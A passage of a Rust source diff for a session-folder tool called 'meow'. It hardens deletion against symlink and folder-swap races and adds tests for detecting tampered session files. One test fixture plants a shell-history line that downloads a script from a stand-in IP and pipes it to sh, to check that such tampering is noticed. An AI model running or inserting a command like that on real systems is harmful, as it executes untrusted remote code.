+            return Ok(());
+        }
+        if !self.dir.join(PROFILE_FILE).is_file() {
+            return Ok(());
+        }
+        let mut now = Snapshot::of(&self.dir);
+        if (self.doubtful && !self.started)
+            || self
+                .start
+                .as_ref()
+                .is_some_and(|start| start.replaced_by(&now))
+        {
+            now.odd = true;
+        }
+        write_seen(&self.home, mark, &now)
+    }
+}
+
+impl Drop for SessionFiles {
+    fn drop(&mut self) {
+        let _ = self.record();
+    }
+}
+
 #[cfg(windows)]
 fn is_local_absolute_dir_path(dir: &Path) -> bool {
     use std::path::{Component, Prefix};
@@ -2584,6 +3317,9 @@ pub struct WorkspaceSummary {
     /// Background tasks with pending or interrupted stages.
     pub unfinished_tasks: usize,
     pub last_active: Option<SystemTime>,
+    /// The folder's device and number when it was listed (Unix), which
+    /// `meow delete` checks before it removes anything.
+    pub id: Option<(u64, u64)>,
 }
 
 /// Every session: the ones in `./meow` of `cwd`, the ones this user saved
@@ -2694,6 +3430,7 @@ fn summarize(
             crate::queue::count_unfinished(&dir.join("state.db"))
         },
         last_active: last_active(dir),
+        id: held_id(dir),
     })
 }
 
@@ -2749,6 +3486,22 @@ pub fn ensure_closed(workspace: &WorkspaceSummary) -> Result<()> {
 /// Refused while a session is open. Its record goes too, and its `./meow`
 /// once nothing but the `.gitignore` is left there.
 pub fn delete(home: &MeowHome, workspace: &WorkspaceSummary) -> Result<()> {
+    check_session_place(&workspace.dir)?;
+    // Opened once, never through a link: what is checked and removed below
+    // is this folder, whatever `./meow` is swapped for meanwhile, and it
+    // must be the one listed.
+    #[cfg(unix)]
+    let held = {
+        let held = HeldDir::open(&workspace.dir)
+            .with_context(|| format!("cannot delete {}", workspace.dir.display()))?;
+        if workspace.id != Some(held.id) {
+            bail!(
+                "{} changed since it was listed; nothing was deleted",
+                workspace.dir.display()
+            );
+        }
+        held
+    };
     if let (Some(_), Some(sessions)) = (folder_session(&workspace.dir), workspace.dir.parent()) {
         // Never through a linked `./meow` to whatever it leads to.
         refuse_symlink(sessions)?;
@@ -2758,16 +3511,189 @@ pub fn delete(home: &MeowHome, workspace: &WorkspaceSummary) -> Result<()> {
     let mark = profile_mark(&workspace.dir).flatten();
     // fish keeps the session's history in its own folder.
     let fish_history = crate::shims::fish_history_file(&workspace.dir);
+    // The lock and the mark above were read from the folder opened.
+    #[cfg(unix)]
+    held.remove(&workspace.dir)
+        .with_context(|| format!("cannot delete {}", workspace.dir.display()))?;
+    #[cfg(not(unix))]
     fs::remove_dir_all(&workspace.dir)
         .with_context(|| format!("cannot delete {}", workspace.dir.display()))?;
     if let Some(file) = fish_history {
         let _ = fs::remove_file(file);
     }
     forget(home, &workspace.dir, mark.as_deref())?;
+    if let Some(mark) = mark.filter(|mark| is_valid_mark(mark)) {
+        // What meow knew of its files, unless another place keeps that mark.
+        if !read_record(home).iter().any(|entry| entry.mark == mark) {
+            let _ = fs::remove_file(seen_path(home, &mark));
+        }
+    }
     if let (Some(_), Some(sessions)) = (folder_session(&workspace.dir), workspace.dir.parent()) {
         remove_if_only_marker(sessions);
     }
     Ok(())
+}
+
+/// A session folder opened through open folders: the folder that holds it
+/// (`./meow`, `~/.meow/workspaces`, or the folder of an old `./.meow`) and
+/// the session in it are each opened without following a link, and both
+/// must be this user's. Removing it never looks its path up again, so a
+/// `./meow` swapped for a link or for another folder cannot send the
+/// removal anywhere else.
+#[cfg(unix)]
+struct HeldDir {
+    parent: fs::File,
+    name: std::ffi::CString,
+    /// The session folder's device and number.
+    id: (u64, u64),
+}
+
+#[cfg(unix)]
+impl HeldDir {
+    fn open(dir: &Path) -> io::Result<Self> {
+        use std::ffi::CString;
+        use std::os::fd::AsRawFd;
+        use std::os::unix::ffi::OsStrExt;
+        use std::os::unix::fs::MetadataExt;
+        let parts = dir
+            .parent()
+            .and_then(|parent| Some((parent.parent()?, parent.file_name()?, dir.file_name()?)));
+        let Some((above, parent, name)) = parts else {
+            return Err(io::Error::other("it has no parent folder"));
+        };
+        // Links above the folder that holds it are the user's own way there.
+        let above = fs::canonicalize(above)?;
+        let above = open_dir_at(libc::AT_FDCWD, &CString::new(above.as_os_str().as_bytes())?)?;
+        let parent = open_dir_at(above.as_raw_fd(), &CString::new(parent.as_bytes())?)?;
+        verify_unix_owner_meta(&parent.metadata()?, dir)?;
+        let name = CString::new(name.as_bytes())?;
+        let found = open_dir_at(parent.as_raw_fd(), &name)?.metadata()?;
+        verify_unix_owner_meta(&found, dir)?;
+        Ok(Self {
+            parent,
+            name,
+            id: (found.dev(), found.ino()),
+        })
+    }
+
+    /// Removes the folder with everything in it, relative to the open
+    /// folders. `dir` (its path) must still lead to it: what was read by
+    /// path meanwhile (the lock, the mark) was read from it.
+    fn remove(&self, dir: &Path) -> io::Result<()> {
+        use std::os::fd::AsRawFd;
+        use std::os::unix::fs::MetadataExt;
+        let same = |meta: fs::Metadata| (meta.dev(), meta.ino()) == self.id;
+        let found = open_dir_at(self.parent.as_raw_fd(), &self.name)?.metadata()?;
+        if !same(found) || !fs::symlink_metadata(dir).is_ok_and(same) {
+            return Err(io::Error::other("it was replaced while being deleted"));
+        }
+        remove_tree_at(self.parent.as_raw_fd(), &self.name, 0)
+    }
+}
+
+/// The device and number of the session folder `dir`, found as
+/// [`HeldDir`] finds it; `None` where that fails.
+#[cfg(unix)]
+fn held_id(dir: &Path) -> Option<(u64, u64)> {
+    HeldDir::open(dir).ok().map(|held| held.id)
+}
+
+#[cfg(not(unix))]
+fn held_id(_dir: &Path) -> Option<(u64, u64)> {
+    None
+}
+
+/// Opens the folder `name` in the folder open as `parent`, never through a
+/// link and never waiting on a pipe.
+#[cfg(unix)]
+fn open_dir_at(parent: std::os::fd::RawFd, name: &std::ffi::CStr) -> io::Result<fs::File> {
+    use std::os::fd::FromRawFd;
+    let flags = libc::O_RDONLY | libc::O_DIRECTORY | libc::O_NOFOLLOW | libc::O_NONBLOCK;
+    // SAFETY: a valid descriptor (or AT_FDCWD) and a valid C string.
+    let fd = unsafe { libc::openat(parent, name.as_ptr(), flags | libc::O_CLOEXEC) };
+    if fd < 0 {
+        return Err(io::Error::last_os_error());
+    }
+    // SAFETY: `fd` was just opened and is owned by nothing else.
+    Ok(unsafe { fs::File::from_raw_fd(fd) })
+}
+
+/// The names in the open folder `dir`, without `.` and `..`.
+#[cfg(unix)]
+fn names_in(dir: &fs::File) -> io::Result<Vec<std::ffi::CString>> {
+    use std::os::fd::AsRawFd;
+    // SAFETY: duplicates a valid descriptor; the stream below owns the copy.
+    let fd = unsafe { libc::fcntl(dir.as_raw_fd(), libc::F_DUPFD_CLOEXEC, 0) };
+    if fd < 0 {
+        return Err(io::Error::last_os_error());
+    }
+    // SAFETY: `fd` is a valid descriptor of a folder.
+    let stream = unsafe { libc::fdopendir(fd) };
+    if stream.is_null() {
+        let error = io::Error::last_os_error();
+        // SAFETY: `fd` is still ours when `fdopendir` fails.
+        unsafe { libc::close(fd) };
+        return Err(error);
+    }
+    let mut names = Vec::new();
+    loop {
+        // SAFETY: a valid stream; an entry stays valid until the next call.
+        let entry = unsafe { libc::readdir(stream) };
+        if entry.is_null() {
+            break;
+        }
+        // SAFETY: `d_name` is NUL-terminated.
+        let name = unsafe { std::ffi::CStr::from_ptr((*entry).d_name.as_ptr()) };
+        if name.to_bytes() != b"." && name.to_bytes() != b".." {
+            names.push(name.to_owned());
+        }
+    }
+    // SAFETY: closes the stream and the copied descriptor, once.
+    unsafe { libc::closedir(stream) };
+    Ok(names)
+}
+
+/// How deep `meow delete` follows folders inside a session.
+#[cfg(unix)]
+const MAX_DELETE_DEPTH: usize = 256;
+
+/// Removes `name` from the folder open as `parent`: a folder with everything
+/// in it, anything else (a link included) by itself.
+#[cfg(unix)]
+fn remove_tree_at(
+    parent: std::os::fd::RawFd,
+    name: &std::ffi::CStr,
+    depth: usize,
+) -> io::Result<()> {
+    use std::os::fd::AsRawFd;
+    let gone = |result: libc::c_int| -> io::Result<()> {
+        if result == 0 {
+            return Ok(());
+        }
+        let error = io::Error::last_os_error();
+        match error.kind() {
+            io::ErrorKind::NotFound => Ok(()),
+            _ => Err(error),
+        }
+    };
+    let dir = match open_dir_at(parent, name) {
+        Ok(dir) => dir,
+        Err(error) if matches!(error.raw_os_error(), Some(libc::ENOTDIR | libc::ELOOP)) => {
+            // SAFETY: a valid descriptor and C string.
+            return gone(unsafe { libc::unlinkat(parent, name.as_ptr(), 0) });
+        }
+        Err(error) if error.kind() == io::ErrorKind::NotFound => return Ok(()),
+        Err(error) => return Err(error),
+    };
+    if depth > MAX_DELETE_DEPTH {
+        return Err(io::Error::other("it is nested too deeply"));
+    }
+    for entry in names_in(&dir)? {
+        remove_tree_at(dir.as_raw_fd(), &entry, depth + 1)?;
+    }
+    drop(dir);
+    // SAFETY: a valid descriptor and C string.
+    gone(unsafe { libc::unlinkat(parent, name.as_ptr(), libc::AT_REMOVEDIR) })
 }
 
 /// Number of hosts in a `graph.json`, read without validating the rest.
@@ -3988,6 +4914,7 @@ foreach ($rule in $acl.GetAccessRules($true, $true, $sid)) {
             hosts: if local { 12 } else { 0 },
             unfinished_tasks: usize::from(mode.is_none()),
             last_active: Some(now - Duration::from_secs(secs)),
+            id: None,
         };
         let text = format_listing_with_home(
             &[
@@ -4434,16 +5361,12 @@ foreach ($rule in $acl.GetAccessRules($true, $true, $sid)) {
                 chmod(&shared, mode);
                 refused(&shared, "other users can write");
             }
+            // Group write: fine for a group that is the user's alone (a
+            // user private group), not for one others are in (macOS's
+            // staff, a shared `users`), whatever the user's own group is.
             chmod(&shared, 0o775);
-            {
-                use std::os::unix::fs::MetadataExt;
-                let meta = fs::metadata(&shared).unwrap();
-                if meta.gid() == effective_ids().1 {
-                    assert_eq!(check(&shared), Ok(()), "the user's own group");
-                } else {
-                    refused(&shared, "other users can write");
-                }
-            }
+            crate::perms::with_private_group(true, || assert_eq!(check(&shared), Ok(())));
+            crate::perms::with_private_group(false, || refused(&shared, "other users can write"));
             chmod(&shared, 0o755);
             assert_eq!(check(&shared), Ok(()));
             chmod(&shared, 0o1777);
@@ -4610,6 +5533,13 @@ foreach ($rule in $acl.GetAccessRules($true, $true, $sid)) {
         chmod(&open_to_all, 0o1777);
         assert_eq!(check(&inside), Ok(()));
         assert_eq!(check(&link), Ok(()));
+        // A folder above that a group shared with others can write to.
+        chmod(&open_to_all, 0o775);
+        crate::perms::with_private_group(false, || {
+            assert_eq!(check(&inside), Err(above.into()));
+            assert_eq!(check(&link), Err(above.into()));
+        });
+        crate::perms::with_private_group(true, || assert_eq!(check(&inside), Ok(())));
         chmod(&open_to_all, 0o755);
 
         // Another account's folder, or one below another account's: that
@@ -4634,6 +5564,138 @@ foreach ($rule in $acl.GetAccessRules($true, $true, $sid)) {
                 Err("a folder above it belongs to another user".into())
             );
         }
+    }
+
+    /// A folder's permissions can change after a session was made in it:
+    /// the session is opened, used by helpers and deleted only while no
+    /// other account could swap its files.
+    #[cfg(unix)]
+    #[test]
+    fn an_existing_session_is_used_only_while_its_folder_is_still_safe() {
+        let fx = fixture();
+        let proj = other_folder(&fx, "proj");
+        let made = open_in(&fx, &proj, "acme");
+        let location = Location::Folder(proj.clone());
+        let elsewhere = other_folder(&fx, "elsewhere");
+        let refused = |error: anyhow::Error, why: &str| {
+            let said = format!("{error:#}");
+            assert!(said.contains(why), "{said}");
+            assert!(said.contains(&proj.display().to_string()), "{said}");
+        };
+        let all_refused = |why: &str| {
+            let open = Workspace::open_at(&fx.home, &location, "acme", Mode::Light);
+            refused(open.unwrap_err(), why);
+            let loaded = Workspace::load(&made.dir).unwrap();
+            refused(loaded.ensure_own(&fx.home, &elsewhere).unwrap_err(), why);
+            let target = find_for_deletion(&fx.home, &elsewhere, Some("acme")).unwrap();
+            refused(delete(&fx.home, &target).unwrap_err(), why);
+            assert!(made.dir.join(PROFILE_FILE).is_file());
+        };
+        // Writable by a group others are in (macOS's staff, `users`).
+        chmod(&proj, 0o775);
+        crate::perms::with_private_group(false, || all_refused("other users can write to it"));
+        crate::perms::with_private_group(true, || {
+            Workspace::open_at(&fx.home, &location, "acme", Mode::Light).unwrap();
+            Workspace::load(&made.dir)
+                .unwrap()
+                .ensure_own(&fx.home, &elsewhere)
+                .unwrap();
+        });
+        chmod(&proj, 0o707);
+        all_refused("other users can write to it");
+        // Below a folder others can change.
+        chmod(&proj, 0o755);
+        let above = proj.parent().unwrap().to_path_buf();
+        let mode = mode_of(&above);
+        chmod(&above, 0o777);
+        all_refused("other users can change a folder above it");
+        chmod(&above, mode);
+        // Writable through an access list for another account.
+        #[cfg(any(target_os = "linux", target_os = "android"))]
+        if crate::perms::grant_write_acl(&proj, effective_ids().0.wrapping_add(4242)) {
+            crate::perms::with_private_group(true, || all_refused("other users can write to it"));
+            assert_eq!(
+                check_new_folder(&fx.home, &proj, "beta"),
+                Err("other users can write to it".into())
+            );
+            let inside = proj.join("inside");
+            fs::create_dir(&inside).unwrap();
+            assert_eq!(
+                check_new_folder(&fx.home, &inside, "beta"),
+                Err("other users can change a folder above it".into())
+            );
+            // `chmod 755` takes write away from the access list's mask.
+            chmod(&proj, 0o755);
+        }
+        // Safe again, all of it works; an old ./.meow is checked the same.
+        Workspace::open_at(&fx.home, &location, "acme", Mode::Light).unwrap();
+        let target = find_for_deletion(&fx.home, &elsewhere, Some("acme")).unwrap();
+        delete(&fx.home, &target).unwrap();
+        assert!(!made.dir.exists());
+        let legacy = Location::Legacy(proj.clone());
+        Workspace::open_at(&fx.home, &legacy, "old", Mode::Light).unwrap();
+        chmod(&proj, 0o777);
+        let error = Workspace::open_at(&fx.home, &legacy, "old", Mode::Light).unwrap_err();
+        refused(error, "other users can write to it");
+        chmod(&proj, 0o755);
+    }
+
+    /// `meow delete` removes the folder it checked, even if `./meow` is
+    /// swapped on the way (by an account that could write to the folder):
+    /// for a link to elsewhere, or for another folder with a session
+    /// folder of the same name.
+    #[cfg(unix)]
+    #[test]
+    fn deleting_never_reaches_a_folder_swapped_in_on_the_way() {
+        let fx = fixture();
+        let (acme, _) = open(&fx, "acme", true);
+        fs::create_dir_all(acme.dir.join("chats").join("deep")).unwrap();
+        fs::write(acme.dir.join("chats").join("deep").join("a.md"), "x").unwrap();
+        let outside = other_folder(&fx, "outside");
+        fs::write(outside.join("keep"), "x").unwrap();
+        std::os::unix::fs::symlink(&outside, acme.dir.join("tmp").join("link")).unwrap();
+        let listed = find_for_deletion(&fx.home, &fx.cwd, Some("acme")).unwrap();
+        let meow = fx.cwd.join("meow");
+        let moved = fx.cwd.join("meow.moved");
+        let decoy = other_folder(&fx, "decoy");
+        fs::create_dir(decoy.join("acme")).unwrap();
+        fs::write(decoy.join("acme").join("keep"), "x").unwrap();
+        fs::copy(acme.profile_path(), decoy.join("acme").join(PROFILE_FILE)).unwrap();
+        let swap_in = |what: &Path| {
+            fs::rename(&meow, &moved).unwrap();
+            std::os::unix::fs::symlink(what, &meow).unwrap();
+        };
+        let swap_back = || {
+            fs::remove_file(&meow).unwrap();
+            fs::rename(&moved, &meow).unwrap();
+        };
+
+        // Swapped for a link before `meow delete` looks at anything.
+        swap_in(&decoy);
+        assert!(delete(&fx.home, &listed).is_err());
+        assert!(decoy.join("acme").join("keep").is_file());
+        swap_back();
+        // For another folder of the user's (renamed in place).
+        fs::rename(&meow, &moved).unwrap();
+        fs::rename(&decoy, &meow).unwrap();
+        let error = format!("{:#}", delete(&fx.home, &listed).unwrap_err());
+        assert!(error.contains("changed since it was listed"), "{error}");
+        assert!(meow.join("acme").join("keep").is_file());
+        fs::rename(&meow, &decoy).unwrap();
+        fs::rename(&moved, &meow).unwrap();
+        // After the folder was opened: nothing is removed through the link.
+        let held = HeldDir::open(&acme.dir).unwrap();
+        swap_in(&decoy);
+        let error = held.remove(&acme.dir).unwrap_err();
+        assert!(error.to_string().contains("replaced"), "{error}");
+        assert!(decoy.join("acme").join("keep").is_file());
+        swap_back();
+
+        delete(&fx.home, &listed).unwrap();
+        assert!(!acme.dir.exists());
+        // A link inside is removed, never followed.
+        assert!(outside.join("keep").is_file());
+        assert!(decoy.join("acme").join("keep").is_file());
     }
 
     #[test]
@@ -4741,13 +5803,16 @@ foreach ($rule in $acl.GetAccessRules($true, $true, $sid)) {
             Some(Location::Folder(saved.clone()))
         );
 
-        // Accepted, the copy gets a mark of its own; deleting it later
-        // leaves the original the user's.
+        // The copy cannot be accepted while the original has its name;
+        // there, `meow delete beta` finds the original and `--local` the
+        // copy. Deleting the copy leaves the original the user's.
         let location = Location::Folder(copy.clone());
         let (mut ws, _) = Workspace::open_at(&fx.home, &location, "beta", Mode::Light).unwrap();
-        ws.adopt(&fx.home, Mode::Light).unwrap();
-        assert_ne!(ws.profile.id.as_deref(), Some(mark.as_str()));
-        let target = find_for_deletion(&fx.home, &copy, Some("beta")).unwrap();
+        assert!(ws.adopt(&fx.home, Mode::Light).is_err());
+        assert_eq!(ws.profile.id.as_deref(), Some(mark.as_str()));
+        let by_name = find_for_deletion(&fx.home, &copy, Some("beta")).unwrap();
+        assert_eq!(by_name.dir, original.dir);
+        let target = find_for_deletion(&fx.home, &copy, None).unwrap();
         assert_eq!(target.dir, copied);
         delete(&fx.home, &target).unwrap();
         assert!(!original.is_foreign(&fx.home));
@@ -4880,6 +5945,486 @@ foreach ($rule in $acl.GetAccessRules($true, $true, $sid)) {
             home_location(&fx.home, &other, "newer").unwrap(),
             Location::Home
         );
+    }
+
+    /// A folder that comes with `./meow/<name>` named like one of the
+    /// user's own sessions: `meow <name>` there still opens the user's own,
+    /// and the other cannot be accepted under that name.
+    #[test]
+    fn a_session_that_came_with_a_folder_never_takes_the_name_of_the_users_own() {
+        let fx = fixture();
+        let mine = other_folder(&fx, "mine");
+        let own = open_in(&fx, &mine, "acme");
+        let cloned = other_folder(&fx, "cloned");
+        let ship = |folder: &Path, name: &str| {
+            let dir = folder.join("meow").join(name);
+            fs::create_dir_all(&dir).unwrap();
+            fs::write(folder.join("meow").join(".gitignore"), SESSIONS_MARKER_TEXT).unwrap();
+            fs::write(
+                dir.join(PROFILE_FILE),
+                format!("name = \"{name}\"\nmode = \"aggressive\"\nid = \"00112233445566778899aabbccddeeff\"\n"),
+            )
+            .unwrap();
+            dir
+        };
+        let shipped = ship(&cloned, "acme");
+        let found = find_session(&fx.home, &cloned, "acme").unwrap();
+        assert_eq!(found, Some(Location::Folder(mine.clone())));
+        assert_eq!(
+            foreign_here(&fx.home, &cloned, "acme"),
+            Some(shipped.clone())
+        );
+        assert_eq!(foreign_here(&fx.home, &mine, "acme"), None);
+        // `--local` opens it to look at; accepting it under the name fails.
+        let location = local_location(&fx.home, &cloned, "acme").unwrap();
+        let (mut ws, _) = Workspace::open_at(&fx.home, &location, "acme", Mode::Light).unwrap();
+        assert!(ws.is_foreign(&fx.home));
+        fs::write(ws.history_path("zsh"), "kept\n").unwrap();
+        let said = format!("{:#}", ws.adopt(&fx.home, Mode::Light).unwrap_err());
+        assert!(said.contains(&own.dir.display().to_string()), "{said}");
+        assert!(ws.is_foreign(&fx.home));
+        assert!(
+            ws.history_path("zsh").exists(),
+            "refused before changing it"
+        );
+        let elsewhere = other_folder(&fx, "elsewhere");
+        assert_eq!(
+            find_session(&fx.home, &elsewhere, "acme").unwrap(),
+            Some(Location::Folder(mine.clone()))
+        );
+        // The same for a session in ~/.meow/workspaces.
+        open(&fx, "home-one", false);
+        let shipped = ship(&cloned, "home-one");
+        assert_eq!(
+            find_session(&fx.home, &cloned, "home-one").unwrap(),
+            Some(Location::Home)
+        );
+        assert_eq!(foreign_here(&fx.home, &cloned, "home-one"), Some(shipped));
+        // A name the user has no session of: the one here is found, to be
+        // accepted.
+        let beta = ship(&cloned, "beta");
+        assert_eq!(
+            find_session(&fx.home, &cloned, "beta").unwrap(),
+            Some(Location::Folder(cloned.clone()))
+        );
+        let (mut ws, _) = Workspace::open_at(
+            &fx.home,
+            &Location::Folder(cloned.clone()),
+            "beta",
+            Mode::Light,
+        )
+        .unwrap();
+        ws.adopt(&fx.home, Mode::Light).unwrap();
+        assert_eq!(ws.dir, beta);
+        assert_eq!(foreign_here(&fx.home, &cloned, "beta"), None);
+    }
+
+    /// A `git pull` or `git checkout` in the folder (git treats ignored
+    /// files as expendable), or an unpacked archive, that replaces files of
+    /// the user's own session: the next open tells, and helpers wait for it.
+    #[test]
+    fn files_changed_outside_meow_are_noticed() {
+        let fx = fixture();
+        let (ws, _) = open(&fx, "acme", true);
+        let record = || drop(SessionFiles::for_session(&fx.home, &ws, false));
+        // Never recorded (a session an older meow made): taken as it is.
+        fs::write(ws.history_path("zsh"), ": 1:0;echo mine\n").unwrap();
+        assert!(!ws.files_changed(&fx.home));
+        fs::write(ws.last_cwd_path(), "/srv\n").unwrap();
+        fs::write(ws.state_db_path(), "db").unwrap();
+        fs::write(ws.chats_dir().join("192.0.2.5.md"), "# notes\n").unwrap();
+        record();
+        assert!(!ws.files_changed(&fx.home));
+        ws.ensure_own(&fx.home, &fx.cwd).unwrap();
+        let append = |path: &Path, text: &str| {
+            let mut file = OpenOptions::new()
+                .append(true)
+                .create(true)
+                .open(path)
+                .unwrap();
+            file.write_all(text.as_bytes()).unwrap();
+        };
+        type Change = fn(&Workspace);
+        let changes: [(&str, Change); 7] = [
+            ("replaced", |ws| {
+                fs::remove_file(ws.history_path("zsh")).unwrap();
+                fs::write(
+                    ws.history_path("zsh"),
+                    ": 1:0;curl -s http://198.51.100.7/i | sh\n",
+                )
+                .unwrap();
+            }),
+            ("written in place", |ws| {
+                fs::write(ws.last_cwd_path(), "/tmp/elsewhere\n").unwrap()
+            }),
+            ("new", |ws| {
+                fs::write(ws.history_path("bash"), "planted\n").unwrap()
+            }),
+            ("a new chat", |ws| {
+                fs::write(ws.chats_dir().join("198.51.100.7.md"), "x").unwrap()
+            }),
+            ("a database log", |ws| {
+                fs::write(ws.dir.join("state.db-wal"), "frames").unwrap()
+            }),
+            ("a folder", |ws| {
+                fs::create_dir(ws.dir.join("graph.json")).unwrap()
+            }),
+            ("graph.json", |ws| {
+                fs::write(ws.graph_path(), "{\"hosts\":{}}").unwrap()
+            }),
+        ];
+        for (what, change) in changes {
+            change(&ws);
+            assert!(ws.files_changed(&fx.home), "{what}");
+            let said = format!("{:#}", ws.ensure_own(&fx.home, &fx.cwd).unwrap_err());
+            assert!(said.contains("changed outside meow"), "{what}: {said}");
+            assert!(said.contains("`meow acme`"), "{what}: {said}");
+            // What helpers write is not taken as meow's own meanwhile.
+            drop(SessionFiles::for_helper(&fx.home, &ws));
+            assert!(ws.files_changed(&fx.home), "{what}");
+            let _ = fs::remove_dir(ws.dir.join("graph.json"));
+            record();
+            assert!(!ws.files_changed(&fx.home), "{what}");
+        }
+        // Gone files, appends recorded by the session, and the empty log a
+        // read-only open of the database leaves change nothing.
+        fs::remove_file(ws.history_path("bash")).unwrap();
+        fs::remove_file(ws.dir.join("state.db-wal")).unwrap();
+        fs::write(ws.dir.join("state.db-wal"), "").unwrap();
+        assert!(!ws.files_changed(&fx.home));
+        // While a session holds the lock, helpers leave the record to it.
+        let lock = crate::lock::SessionLock::acquire(&ws.lock_path()).unwrap();
+        append(&ws.replay_path(), "ls\n");
+        ws.ensure_own(&fx.home, &fx.cwd).unwrap();
+        drop(SessionFiles::for_helper(&fx.home, &ws));
+        assert!(ws.files_changed(&fx.home));
+        drop(SessionFiles::for_session(&fx.home, &ws, false));
+        drop(lock);
+        assert!(!ws.files_changed(&fx.home));
+
+        // What the user is shown is dropped: histories and the last folder.
+        ws.drop_carried_files();
+        assert!(!ws.last_cwd_path().exists());
+        for shell in HISTORY_SHELLS {
+            assert!(!ws.history_path(shell).exists(), "{shell}");
+        }
+        // A session in ~/.meow, and one meow never recorded, are not checked.
+        let (home_ws, _) = open(&fx, "home-one", false);
+        fs::write(home_ws.history_path("zsh"), "x\n").unwrap();
+        assert!(!home_ws.files_changed(&fx.home));
+        // Deleting a session forgets what meow knew of its files.
+        let mark = ws.profile.id.clone().unwrap();
+        assert!(seen_path(&fx.home, &mark).is_file());
+        #[cfg(unix)]
+        assert_eq!(mode_of(&seen_path(&fx.home, &mark)), 0o600);
+        let target = find_for_deletion(&fx.home, &fx.cwd, Some("acme")).unwrap();
+        delete(&fx.home, &target).unwrap();
+        assert!(!seen_path(&fx.home, &mark).exists());
+    }
+
+    /// A file meow only changes in place (`state.db`, `replay.sh`,
+    /// `last_cwd`, chats) replaced while the session runs (a `git pull` in
+    /// its own shell) is not recorded as meow's own at the end.
+    #[test]
+    fn files_replaced_while_the_session_runs_are_not_recorded_as_meows() {
+        let fx = fixture();
+        let (ws, _) = open(&fx, "acme", true);
+        for name in ["state.db", "replay.sh", "last_cwd"] {
+            fs::write(ws.dir.join(name), "x").unwrap();
+        }
+        fs::write(ws.chats_dir().join("192.0.2.5.md"), "x").unwrap();
+        // A session that appends, rewrites its graph and writes new chats.
+        let files = SessionFiles::for_session(&fx.home, &ws, false);
+        OpenOptions::new()
+            .append(true)
+            .open(ws.replay_path())
+            .unwrap()
+            .write_all(b"more\n")
+            .unwrap();
+        write_private_atomic(&ws.graph_path(), b"{}").unwrap();
+        fs::write(ws.chats_dir().join("192.0.2.6.md"), "x").unwrap();
+        drop(files);
+        assert!(!ws.files_changed(&fx.home));
+        for name in ["state.db", "replay.sh", "last_cwd", "chats/192.0.2.5.md"] {
+            let files = SessionFiles::for_session(&fx.home, &ws, false);
+            // Later than the file it replaces was made, as a pull is.
+            std::thread::sleep(Duration::from_millis(30));
+            let path = ws.dir.join(name);
+            fs::remove_file(&path).unwrap();
+            fs::write(&path, "planted").unwrap();
+            drop(files);
+            assert!(ws.files_changed(&fx.home), "{name}");
+            // Said once, at the next open; recorded anew after it.
+            drop(SessionFiles::for_session(&fx.home, &ws, false));
+            assert!(!ws.files_changed(&fx.home), "{name}");
+        }
+    }
+
+    /// A remount gives the same files other device numbers (an overlay
+    /// after a container restart, NFS, a removable drive) and, on FAT,
+    /// exFAT or FUSE, other file numbers: that is no change. A file made
+    /// or written at another time, or of another size, is.
+    #[test]
+    fn a_remount_is_not_a_change_outside_meow() {
+        let fx = fixture();
+        let (ws, _) = open(&fx, "acme", true);
+        fs::write(ws.history_path("bash"), "echo mine\n").unwrap();
+        fs::write(ws.state_db_path(), "db").unwrap();
+        drop(SessionFiles::for_session(&fx.home, &ws, false));
+        let mark = ws.profile.id.clone().unwrap();
+        let seen = read_seen(&fx.home, &mark).unwrap();
+        let rewritten = |change: fn(&mut FileId)| {
+            let mut record = seen.clone();
+            for id in record.files.values_mut() {
+                change(id);
+            }
+            write_seen(&fx.home, &mark, &record).unwrap();
+            ws.files_changed(&fx.home)
+        };
+        assert!(!rewritten(|_| {}));
+        assert!(!rewritten(|id| id.ino = id.ino.wrapping_add(7)));
+        assert!(rewritten(|id| id.written += 1));
+        assert!(rewritten(|id| id.size += 1));
+        if seen.files.values().all(|id| id.born != 0) {
+            assert!(rewritten(|id| id.born += 1));
+        }
+        // Where the file system does not say when a file was made, size
+        // and last write decide.
+        assert!(!rewritten(|id| id.born = 0));
+        assert!(!rewritten(|id| {
+            id.born = 0;
+            id.ino = id.ino.wrapping_add(7);
+        }));
+        // Within a session, a file only changed in place keeps its place.
+        let id = FileId {
+            ino: 5,
+            born: 9,
+            size: 1,
+            written: 2,
+        };
+        let moved = FileId { ino: 6, ..id };
+        assert!(id.same_file(&moved));
+        assert!(!id.same_file(&FileId { born: 10, ..id }));
+        let unknown = FileId { born: 0, ..id };
+        assert!(unknown.same_file(&id));
+        assert!(!unknown.same_file(&FileId { born: 0, ..moved }));
+    }
+
+    /// An open that warned about files changed outside meow, or accepted a
+    /// session that came with the folder, and then failed before the shell
+    /// started (a broken graph.json, an error): those files are not taken
+    /// as meow's, so the next open warns again.
+    #[test]
+    fn a_doubtful_session_that_never_started_is_not_taken_as_meows() {
+        let fx = fixture();
+        let (ws, _) = open(&fx, "acme", true);
+        fs::write(ws.state_db_path(), "db").unwrap();
+        drop(SessionFiles::for_session(&fx.home, &ws, false));
+        fs::remove_file(ws.state_db_path()).unwrap();
+        fs::write(ws.state_db_path(), "a queued scan").unwrap();
+        assert!(ws.files_changed(&fx.home));
+        drop(SessionFiles::for_session(&fx.home, &ws, true));
+        assert!(ws.files_changed(&fx.home));
+        drop(SessionFiles::for_session(&fx.home, &ws, true));
+        assert!(ws.files_changed(&fx.home), "every time");
+        let mut files = SessionFiles::for_session(&fx.home, &ws, true);
+        files.started();
+        drop(files);
+        assert!(!ws.files_changed(&fx.home));
+        // The user's own session that fails to start (a broken ai.toml) is
+        // recorded as it is: no warning next time.
+        fs::write(ws.state_db_path(), "the user's db").unwrap();
+        drop(SessionFiles::for_session(&fx.home, &ws, false));
+        assert!(!ws.files_changed(&fx.home));
+    }
+
+    #[test]
+    fn the_record_of_files_reads_back_only_what_meow_wrote() {
+        let mut snapshot = Snapshot::default();
+        let id = FileId {
+            ino: 1_234_567,
+            born: 1_600_000_000_000_000_001,
+            size: 42,
+            written: 1_700_000_000_123_456_789,
+        };
+        snapshot.files.insert("zsh_history".into(), id);
+        snapshot.files.insert("chats/a b.md".into(), id);
+        assert_eq!(
+            Snapshot::from_text(&snapshot.to_text()),
+            Some(snapshot.clone())
+        );
+        snapshot.odd = true;
+        assert_eq!(Snapshot::from_text(&snapshot.to_text()), Some(snapshot));
+        for broken in [
+            "",
+            "meow session files 1\nok\n",
+            "meow session files 2\nmaybe\n",
+            "meow session files 2\nok\n1 2 3\n",
+            "meow session files 2\nok\n1 2 3 4\n",
+            "meow session files 2\nok\n-1 2 3 4 x\n",
+            "meow session files 2\nok\na 2 3 4 x\n",
+        ] {
+            assert_eq!(Snapshot::from_text(broken), None, "{broken:?}");
+        }
+        // A record that is not meow's counts as "changed".
